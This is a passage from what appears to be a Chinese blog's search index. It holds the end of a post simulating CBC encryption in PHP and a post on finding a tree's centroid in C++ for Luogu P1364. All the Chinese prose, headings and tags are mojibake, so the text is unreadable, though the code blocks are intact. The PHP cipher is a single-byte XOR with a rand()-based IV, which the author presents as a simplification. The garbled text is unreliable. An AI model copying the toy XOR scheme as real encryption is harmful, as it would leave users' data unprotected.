<li>åˆ†ç»„ï¼šä¸æ˜æ–‡åˆ†ç»„é•¿åº¦ä¸€è‡´ã€‚</li>
<li>å°†ç¬¬ä¸€æ®µå¯†æ–‡<code>cipher[1]</code>è¿›è¡Œè§£å¯†<code>decrypt()</code>ï¼Œè¯¥è§£å¯†è¿ç®—ä½¿ç”¨çš„å‡½æ•°åº”è¯¥å’Œä¹‹å‰åŠ å¯†å®šä¹‰çš„å‡½æ•°äº’ä¸ºé€†å‡½æ•°ï¼Œå¾—åˆ°çš„ä¸­é—´æ•°æ®å†å’Œä¹‹å‰åŠ å¯†è¿‡ç¨‹å®šä¹‰çš„<code>iv</code>å‘é‡è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå³å¯è·å¾—ç¬¬ä¸€æ®µæ˜æ–‡<code>plain[1]</code>ã€‚</li>
<li>ç¬¬ä¸€æ®µå¯†æ–‡<code>cipher[1]</code>å†å’Œç»è¿‡è§£å¯†åçš„ç¬¬äºŒæ®µå¯†æ–‡<code>cipher[2]</code>è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°ç¬¬äºŒä»£æ˜æ–‡<code>plain[2]</code></li>
<li>â€¦â€¦</li>
<li>å°†å¾—åˆ°çš„æ‰€æœ‰æ˜æ–‡æ®µç»„è£…ï¼Œå½¢æˆæ˜æ–‡ã€‚</li>
</ol>
<h2 id="æ¨¡æ‹Ÿ"><a href="#æ¨¡æ‹Ÿ" class="headerlink" title="æ¨¡æ‹Ÿ"></a>æ¨¡æ‹Ÿ</h2><p>ä¸‹é¢æˆ‘å°†ä½¿ç”¨<code>PHP</code>ä»£ç æ¨¡æ‹Ÿä¸Šè¿°è¿‡ç¨‹ï¼Œä¸ºäº†ç®€å•èµ·è§ï¼ŒåŠ å¯†å‡½æ•°<code>encrypt()</code>å°±ä¸å†™é‚£ä¹ˆå¤æ‚ï¼Œç›´æ¥å°†å¾…åŠ å¯†çš„æ•°æ®å’Œå¯†é’¥å¼‚æˆ–ï¼Œè§£å¯†çš„æ—¶å€™å°†å¯†æ–‡å’Œå¯†é’¥å¼‚æˆ–å³å¯ã€‚</p>
<p>ä¸‹é¢æ˜¯<code>CBC</code>åŠ å¯†å’Œè§£ç çš„æ¨¡æ‹Ÿï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// å¯†é’¥</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, <span class="number">23</span>);</span><br><span class="line"><span class="comment">// äº§ç”Ÿé•¿åº¦ä¸º 16å­—èŠ‚ çš„éšæœº iv å‘é‡ï¼Œä¸€ä¸ªå­—ç¬¦åœ¨è®¡ç®—æœºå†…éƒ¨ä½¿ç”¨8æ¯”ç‰¹è¡¨ç¤ºï¼Œå³ä¸€ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_init_vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$random_iv = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; <span class="number">16</span>;$i++) &#123;</span><br><span class="line">        $random_iv .= chr(rand(<span class="number">1</span>, <span class="number">128</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŠ å¯†è¿ç®—</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å’Œå¯†é’¥å¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// è§£å¯†è¿ç®—</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">	$tmp = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å’Œå¯†é’¥å¼‚æˆ–</span></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i &lt; strlen($data);$i++) &#123;</span><br><span class="line">        $tmp .= chr(ord($data[$i]) ^ SECRET_KEY);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC åŠ å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_encode</span><span class="params">($plain, $len)</span></span>&#123;</span><br><span class="line">	$iv = get_random_init_vector();</span><br><span class="line">	<span class="comment">// åˆ†æ®µ</span></span><br><span class="line">	$plain_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$plain_tmp[$i] = substr($plain, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$cipher = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å¯¹äºæ¯ä¸€æ®µæ˜æ–‡éƒ½è¦è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// ä¸Šä¸€æ®µå¯†æ–‡å…ˆå’Œæœ¬æ˜æ–‡åšå¼‚æˆ–è¿ç®—</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_tmp[$i][$j]));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// å†è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">		$cipher_i = encode($str_tmp);</span><br><span class="line">		$cipher .= $cipher_i;</span><br><span class="line">		$last_cipher = $cipher_i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'iv'</span> =&gt; $iv,</span><br><span class="line">		<span class="string">'cipher'</span> =&gt; $cipher</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CBC è§£å¯†</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cbc_decode</span><span class="params">($cipher, $iv, $len)</span></span>&#123;</span><br><span class="line">	<span class="comment">// åˆ†æ®µ</span></span><br><span class="line">	$cipher_tmp = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		$cipher_tmp[$i] = substr($cipher, $i * <span class="number">16</span>, <span class="number">16</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$plain = <span class="string">""</span>;</span><br><span class="line">	<span class="comment">// å¯¹äºæ¯ä¸€æ®µå¯†æ–‡éƒ½è¦è¿›è¡Œè§£å¯†</span></span><br><span class="line">	$last_cipher = $iv;</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; $len;$i++)&#123;</span><br><span class="line">		<span class="comment">// å…ˆè¿›è¡Œè§£å¯†</span></span><br><span class="line">		$plain_i_tmp = decode($cipher_tmp[$i]);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// å†å’Œä¸Šä¸€æ®µå¯†æ–‡åšå¼‚æˆ–è¿ç®—</span></span><br><span class="line">		$str_tmp = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; <span class="number">16</span>; $j++)&#123;</span><br><span class="line">			$str_tmp .= chr(ord($last_cipher[$j]) ^ ord($plain_i_tmp[$j]));</span><br><span class="line">		&#125;</span><br><span class="line">		$plain .= $str_tmp;</span><br><span class="line">		$last_cipher = $cipher_tmp[$i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">'plain'</span> =&gt; $plain</span><br><span class="line">	);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mydata = <span class="string">"hello, everybody, this is a string for test....."</span>;</span><br><span class="line">$info = cbc_encode($mydata, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æ•°æ®æ˜¯ï¼š\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $mydata . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"åŠ å¯†åï¼š"</span> . <span class="string">"\n"</span>;</span><br><span class="line">var_dump($info);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"æ ¹æ®åŠ å¯†åå¾—åˆ°çš„å¯†æ–‡è¿›è¡Œè§£å¯†ï¼Œå¾—åˆ°çš„æ•°æ®ï¼š"</span> . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">$data = cbc_decode($info[<span class="string">'cipher'</span>], $info[<span class="string">'iv'</span>], <span class="number">3</span>);</span><br><span class="line">var_dump($data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.yalexin.top/image-20220710144743355.png" alt="image-20220710144743355"></p>
]]></content>
      <categories>
        <category>ç®—æ³•</category>
      </categories>
      <tags>
        <tag>å¯†ç å­¦</tag>
        <tag>CBC</tag>
      </tags>
  </entry>
  <entry>
    <title>æ ‘çš„é‡å¿ƒ</title>
    <url>/2021/04/18/%E6%A0%91%E7%9A%84%E9%87%8D%E5%BF%83/</url>
    <content><![CDATA[<blockquote>
<p>æœ¬æ–‡å‚è€ƒæ´›è°·å¯¹äº<a href="https://www.luogu.com.cn/problem/solution/P1364" target="_blank" rel="noopener">P1364</a>çš„é¢˜è§£</p>
</blockquote>
<h2 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p> å¯¹äºæ ‘ä¸Šçš„æ¯ä¸€ä¸ªç‚¹ï¼Œè®¡ç®—å…¶æ‰€æœ‰å­æ ‘ä¸­æœ€å¤§çš„å­æ ‘èŠ‚ç‚¹æ•°ï¼Œè¿™ä¸ªå€¼æœ€å°çš„ç‚¹å°±æ˜¯è¿™æ£µæ ‘çš„é‡å¿ƒã€‚ <a id="more"></a></p>
<h2 id="æ€§è´¨"><a href="#æ€§è´¨" class="headerlink" title="æ€§è´¨"></a>æ€§è´¨</h2><ul>
<li>æ ‘ä¸­æ‰€æœ‰ç‚¹åˆ°æŸä¸ªç‚¹çš„è·ç¦»å’Œä¸­ï¼Œåˆ°é‡å¿ƒçš„è·ç¦»å’Œæ˜¯æœ€å°çš„ï¼Œå¦‚æœæœ‰ä¸¤ä¸ªé‡å¿ƒï¼Œä»–ä»¬çš„è·ç¦»å’Œä¸€æ · </li>
<li>æ’å…¥æˆ–åˆ é™¤ä¸€ä¸ªç‚¹ï¼Œæ ‘çš„é‡å¿ƒçš„ä½ç½®æœ€å¤šç§»åŠ¨ä¸€ä¸ªå•ä½ã€‚ </li>
<li>æŠŠä¸¤æ£µæ ‘é€šè¿‡ä¸€æ¡è¾¹ç›¸è¿ï¼Œæ–°çš„æ ‘çš„é‡å¿ƒåœ¨åŸæ¥ä¸¤æ£µæ ‘é‡å¿ƒçš„è¿çº¿ä¸Šã€‚ </li>
</ul>
<p>è¿™äº›æ€§è´¨æˆ‘å°±ä¸è¯æ˜äº†ï¼Œ<del>æ¯”è¾ƒæ‡’</del>ï¼ˆä¸å¤ªæ‡‚è¯æ˜ï¼‰</p>
<h2 id="æ±‚æ³•"><a href="#æ±‚æ³•" class="headerlink" title="æ±‚æ³•"></a>æ±‚æ³•</h2><h3 id="æ— æƒæ ‘"><a href="#æ— æƒæ ‘" class="headerlink" title="æ— æƒæ ‘"></a>æ— æƒæ ‘</h3><p>å®é™…ä¸Šï¼Œä¸€ä¸ªå¦‚æœå®šä¹‰<code>size[i]</code>ä¸ºä»¥<code>i</code>èŠ‚ç‚¹çš„ä¸ºæ ¹çš„å­æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ï¼Œå¯ä»¥å¾ˆè½»æ˜“åœ°å¾—åˆ°</p>
<p><svg xmlns="http://www.w3.org/2000/svg" width="23.361ex" height="5.447ex" viewbox="0 -1250 10325.7 2407.8" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-2-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/><path id="MJX-2-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/><path id="MJX-2-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/><path id="MJX-2-TEX-I-1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/><path id="MJX-2-TEX-N-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"/><path id="MJX-2-TEX-I-1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"/><path id="MJX-2-TEX-N-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"/><path id="MJX-2-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/><path id="MJX-2-TEX-N-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path id="MJX-2-TEX-N-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/><path id="MJX-2-TEX-LO-2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z"/><path id="MJX-2-TEX-I-1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"/></defs><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><use xlink:href="#MJX-2-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(469, 0)"><use xlink:href="#MJX-2-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(814, 0)"><use xlink:href="#MJX-2-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(1279, 0)"><use xlink:href="#MJX-2-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(1745, 0)"><use xlink:href="#MJX-2-TEX-N-5B"/></g><g data-mml-node="mi" transform="translate(2023, 0)"><use xlink:href="#MJX-2-TEX-I-1D462"/></g><g data-mml-node="mo" transform="translate(2595, 0)"><use xlink:href="#MJX-2-TEX-N-5D"/></g><g data-mml-node="mo" transform="translate(3150.8, 0)"><use xlink:href="#MJX-2-TEX-N-3D"/></g><g data-mml-node="mn" transform="translate(4206.6, 0)"><use xlink:href="#MJX-2-TEX-N-31"/></g><g data-mml-node="mo" transform="translate(4928.8, 0)"><use xlink:href="#MJX-2-TEX-N-2B"/></g><g data-mml-node="munderover" transform="translate(5929, 0)"><g data-mml-node="mo"><use xlink:href="#MJX-2-TEX-LO-2211"/></g><g data-mml-node="TeXAtom" transform="translate(550.5, -1050) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><use xlink:href="#MJX-2-TEX-I-1D463"/></g></g><g data-mml-node="TeXAtom" transform="translate(722, 1150) scale(0.707)" data-mjx-texclass="ORD"/></g><g data-mml-node="mi" transform="translate(7539.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D460"/></g><g data-mml-node="mi" transform="translate(8008.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D456"/></g><g data-mml-node="mi" transform="translate(8353.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D467"/></g><g data-mml-node="mi" transform="translate(8818.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D452"/></g><g data-mml-node="mo" transform="translate(9284.7, 0)"><use xlink:href="#MJX-2-TEX-N-5B"/></g><g data-mml-node="mi" transform="translate(9562.7, 0)"><use xlink:href="#MJX-2-TEX-I-1D463"/></g><g data-mml-node="mo" transform="translate(10047.7, 0)"><use xlink:href="#MJX-2-TEX-N-5D"/></g></g></g></svg></p>
<p>å…¶ä¸­<code>v</code>æ˜¯æ¯ä¸€ä¸ª<code>u</code>çš„é‚»æ¥èŠ‚ç‚¹ã€‚</p>
<p><code>C++</code>å®ç°æ–¹å¼</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author      : YaleXin</span></span><br><span class="line"><span class="comment"> * @Email       : me@yalexin.top</span></span><br><span class="line"><span class="comment"> * @LastEditors : YaleXin</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> total;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> MAX_N = <span class="number">10000</span>;</span><br><span class="line"><span class="comment">// é‚»æ¥è¡¨</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; treeTable[MAX_N + <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// treeSize[i]è¡¨ç¤ºä»¥iä¸ºæ ¹ã€å‘ä¸‹åŒ…å«çš„å­æ ‘çš„èŠ‚ç‚¹ä¸ªæ•°ï¼ˆåŒ…å«è‡ªèº«ï¼‰</span></span><br><span class="line"><span class="keyword">int</span> treeSize[MAX_N + <span class="number">5</span>];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="keyword">int</span> minNode;</span><br><span class="line"><span class="keyword">int</span> minBalance = INF;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> nodeId, <span class="keyword">int</span> parent)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// è‡³å°‘ä¸º 1</span></span><br><span class="line">    treeSize[nodeId] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// maxSubTreeä»£è¡¨nodeIdçš„å„ä¸ªå­ç»“ç‚¹ä¸­æœ€å¤§çš„å­æ ‘æ•°ç›®</span></span><br><span class="line">    <span class="keyword">int</span> maxSubTree = <span class="number">-1</span>, len = treeTable[nodeId].<span class="built_in">size</span>(), son;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        son = treeTable[nodeId][i];</span><br><span class="line">        <span class="keyword">if</span> (son != parent) &#123;</span><br><span class="line">            dfs(son, nodeId);</span><br><span class="line">            treeSize[nodeId] += treeSize[son];</span><br><span class="line">            maxSubTree = <span class="built_in">max</span>(maxSubTree, treeSize[son]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å‘ä¸‹æˆ–è€…å‘ä¸Šçš„å­æ ‘ä¸­ï¼Œé€‰å–ä¸€ä¸ªï¼Œå³çˆ¶èŠ‚ç‚¹æ‰€åœ¨çš„å­æ ‘ä¹Ÿæ˜¯ä½œä¸ºè¯¥èŠ‚ç‚¹çš„â€œå­æ ‘â€</span></span><br><span class="line">    maxSubTree = <span class="built_in">max</span>(maxSubTree, total - treeSize[nodeId]);</span><br><span class="line">    <span class="keyword">if</span> (maxSubTree &lt; minBalance) &#123;</span><br><span class="line">        minBalance = maxSubTree;</span><br><span class="line">        minNode = nodeId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input the number of total node\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;total);</span><br><span class="line">    <span class="keyword">int</span> u, v;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"please input every edge as u v\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= total - <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;u, &amp;v);</span><br><span class="line">        treeTable[u].push_back(v);</span><br><span class="line">        treeTable[v].push_back(u);</span><br><span class="line">    &#125;</span><br><span class="line">    minNode = <span class="number">0</span>;</span><br><span class="line">    minBalance = INF;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The center of gravity of the tree is %d, Maximum node number of a subtree is %d\n"</span>,</span><br><span class="line">             minNode, minBalance);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å¸¦æƒæ ‘"><a href="#å¸¦æƒæ ‘" class="headerlink" title="å¸¦æƒæ ‘"></a>å¸¦æƒæ ‘</h3><p>ä»¥æ´›è°·<a href="https://www.luogu.com.cn/problem/P1364" target="_blank" rel="noopener">P1364</a>ä¸ºä¾‹ï¼Œå…¶å®ƒèƒŒæ™¯äº¦ç±»ä¼¼ï¼š</p>
<p>è¯¥é¢˜å¯è½¬ä¸ºæ‰¾æ ‘çš„é‡å¿ƒè¿›è¡Œæ±‚è§£ã€‚</p>
<p>ä½¿ç”¨<code>f[u]</code>è¡¨ç¤ºä»¥<code>u</code>ä¸ºæ ¹çš„æ€»è·ç¦» ï¼Œ <code>size[u]</code>è¡¨ç¤ºä»¥<code>u</code>ä¸ºæ ¹çš„å­æ ‘çš„å¤§å°ï¼ˆå½“ç„¶äº†ï¼Œæœ¬é¢˜è¦è®¾ç½®ä¸ºç›¸åº”çš„æƒå€¼ï¼‰ ï¼Œå› æ­¤å­æ ‘çš„é‡å¿ƒå°±æ˜¯ï¼š</p>
<p><code>w</code>,å…¶ä¸­<code>f[w] = min(f[i]),1 &lt;= i &lt;= n</code>.</p>
<p>åœ¨ç®—æ³•çš„å¼€å§‹ä¹‹å‰ï¼Œéœ€è¦å…ˆä»»æ„æ±‚ä¸€ä¸ªç‚¹ä½œä¸ºæ ¹è¿›è¡Œæ·±åº¦ä¼˜å…ˆæœç´¢ï¼Œæ±‚å‡ºä»¥è¯¥ç‚¹ä¸ºæ ¹çš„æ€»è·ç¦»ï¼Œè¿™é‡Œä»¥<code>1</code>ä¸ºä¾‹ã€‚</p>
<p>å¯¹äºæ¯ä¸€ä¸ª<code>u</code>èƒ½è¾¾åˆ°çš„ç‚¹<code>v</code> ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹ç¨‹è¿›è¡Œæ±‚è§£ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f[v] &#x3D; f[u] + size[1] - size[v] - size[v]</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢çš„å¼å­çš„æ„ä¹‰æ˜¯ï¼š</p>
<p> å½“æ ¹ä»<code>u</code>å˜ä¸º<code>v</code>çš„æ—¶å€™ï¼Œ<code>v</code>çš„å­æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹åŸæœ¬çš„è·ç¦»è¦åˆ° <code>u</code>ï¼Œç°åœ¨åªéœ€è¦åˆ°<code>v</code>ï¼Œå³è¿™<code>size[v]</code>ä¸ªèŠ‚ç‚¹è·ç¦»éƒ½å‡å°<code>1</code>ï¼Œä¸æ­¤åŒæ—¶ï¼Œé™¤äº†ä»¥<code>v</code>ä¸ºæ ¹çš„å­æ ‘èŠ‚ç‚¹å¤–çš„æ‰€æœ‰çš„ç‚¹ï¼ŒåŸæœ¬åªè¦åˆ°<code>u</code>å³å¯ï¼Œç°åœ¨è¦åˆ°<code>v</code>ï¼Œå³æ¯ä¸ªèŠ‚ç‚¹è·ç¦»éƒ½å¢åŠ äº†<code>1</code>ï¼Œè€Œè¿™äº›èŠ‚ç‚¹å…±æœ‰<code>size[1] - size[v]</code>ã€‚</p>
